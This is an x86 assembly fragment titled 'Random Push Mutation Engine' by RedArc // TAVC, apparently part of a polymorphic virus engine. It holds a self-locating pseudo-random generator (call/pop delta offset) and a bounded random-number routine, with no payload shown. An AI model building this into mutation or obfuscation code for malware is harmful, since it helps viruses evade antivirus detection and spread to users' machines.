; Random Push Mutation Engine
;    (c) by RedArc // TAVC
;------------------------------
; Random procedure RPME
;------------------------------
;Input:
;       BX - some max value
;Output:
;       DX - rnd value [0..bx]
;Destroy:
;       BX, DX

Randomize proc near
RM0:
    push si
    call RM1
RM1:
    RM_Offs equ $-RM0
    pop si
    sub si,RM_Offs
    mov ax,word ptr cs:[si+r2]
    mov byte ptr cs:[si+r1],al
    add ah,al
    mov al,byte ptr cs:[si+r3]
    mov byte ptr cs:[si+r2],al
    add al,ah
    rol al,1
    mov byte ptr cs:[si+r3],al
    pop si
    ret
r3 equ $-RM0
db 35
r2 equ $-RM0
db 91
r1 equ $-RM0
db 4
Randomize endp

RND proc near
        push ax
        cmp bx,0ffffh
        jz RND_0
        inc bx
RND_0:
        cmp bh,0
        jnz RND0
        xor dh,dh
RND0:
        cmp bh,0
        jz RND1
        call Randomize
        mov dh,al
RND1:
        call Randomize
        mov dl,al
        cmp dx,bx
        jnc RND0
        pop ax
        ret
RND endp
